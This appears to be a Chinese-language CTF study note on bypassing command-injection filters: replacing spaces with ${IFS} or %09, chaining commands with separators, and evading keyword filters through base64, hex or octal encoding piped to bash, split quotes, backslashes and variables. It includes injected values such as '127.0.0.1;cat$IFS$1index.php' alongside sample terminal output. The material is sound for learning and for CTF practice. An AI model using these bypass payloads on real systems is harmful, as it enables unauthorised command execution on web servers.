---
title: RCE远程命令执行绕过
date: 2020-03-17 17:01:45
toc: true
tags: 
- CTFhub-RCE
categories: 
- Bypass
---

做ctfhub后小总结，以及参考

## 空格过滤

空格过滤的情况下，可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过

~~~bash
cat<flag //重定向符
cat<>flag //重定向符
cat${IFS}flag //IFS
可能也过滤了{}，用$IFS$1代替：
?ip=127.0.0.1;cat$IFS$1index.php
cat%09flag //其他字符代替
{cat,flag} //{,}
~~~

## 命令分隔符

~~~bash
linux中：%0a 、%0d 、; 、& 、| 、&&、||

windows中：%0a、&、|、%1a（.bat文件中的命令分隔符）

;： 在 shell 中，担任”连续指令”功能的符号就是”分号”。命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其它命令的执行。

&：简单拼接 无制约

&&：前面执行成功后面才会执行

|：符号 左边输出 作为右边输入，所以左边的输出并不显示。当第一条命令失败时，它仍然会执行第二条命令

||：前面执行失败才会执行后面
~~~

## 敏感字符过滤绕过

过滤ls、cat、flag等

### 编码绕过

#### base

~~~bash
[shymdembp:~]
[shym]% echo 'cat' | base64
Y2F0Cg==
[shymdembp:~]
[shym]% `echo 'Y2F0Cg==' | base64 -d` flag.txt
flag{sadas_sadsad_sadasdad-sdsad}
[shymdembp:~]
~~~

#### hex

~~~bash
[shymdembp:~]
[shym]% echo "63617420666C61672E747874" | xxd -r -p|bash
flag{sadas_sadsad_sadasdad-sdsad}
[shymdembp:~]
[shym]%
~~~

#### oct(八进制)

~~~bash
[shymdembp:~]
[shym]% printf "\154\163"
ls%                                                                             [shymdembp:~]
[shym]% printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"
cat /flag%
~~~

### 连字符绕过

~~~bash
[shymdembp:test]
[shym]% ca''t flag
flag{123-4123--213-213-123}
[shymdembp:test]
[shym]% ca''t fl''ag
flag{123-4123--213-213-123}
[shymdembp:test]
[shym]% c''at fla''g
flag{123-4123--213-213-123}
~~~

### 变量绕过

~~~bash
a=l;b=s;$a$b
~~~

### 反斜杠绕过

~~~bash
[shym]% ca\t fl\ag
flag{123-4123--213-213-123}
[shymdembp:test]
[shym]% c\at f\lag
flag{123-4123--213-213-123}
~~~

### ip进制转换绕过

~~~bash
//ip地址过滤可将ip地址转化为数字ip地址

IP地址用“点分十进制”表示，用“.”分成4部分；数字地址是一串用“十进制”表示的数字。
　 比如：百度的IP地址“39.156.69.79”转换成数字地址就是“664552783”。在浏览器中输入664552783就可以访问百度网站
转化网址：http://www.msxindl.com/tools/ip/ip_num.asp
~~~

## 无回显创建文件绕过

~~~bash
linux下用	1>1 可创建文件名为1的空文件。
					a>1 虽报错，但可以创建空文件。
					ls>1 把ls的内容导入1中
~~~

在做这类题目时，一部分会给出源代码，我们可以直接参考源代码进行选择绕过让法。

如果没有，我们需要去猜测后台语句如何构造的，过滤了哪些，还有哪些可以用，然后结合各种绕过方式构造payload。



